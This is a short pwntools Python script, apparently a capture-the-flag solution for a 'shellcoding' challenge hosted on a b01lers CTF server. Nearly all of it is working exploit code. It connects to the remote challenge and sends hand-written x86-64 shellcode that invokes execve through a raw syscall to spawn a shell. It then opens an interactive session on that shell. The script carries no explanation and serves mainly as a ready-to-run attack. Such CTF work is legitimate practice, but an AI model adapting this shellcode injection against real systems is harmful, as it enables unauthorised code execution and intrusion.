#!/usr/bin/env python3

from pwn import *

exe = ELF("./shellcoding-5f75e03fd4f2bb8f5d11ce18ceae2a1d")

context.binary = exe


def conn():
        return process([exe.path])


def main():
    #r = conn()

    r = remote("chal.ctf.b01lers.com", 1007)
    

    shellcode = asm("""
    add rsp, 0x8
    push rsp
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov al, 0x3b
    syscall
    """)

    print(len(shellcode))
    
    r.recvline()

    pause()
    r.send(shellcode)

    r.interactive()


if __name__ == "__main__":
    main()
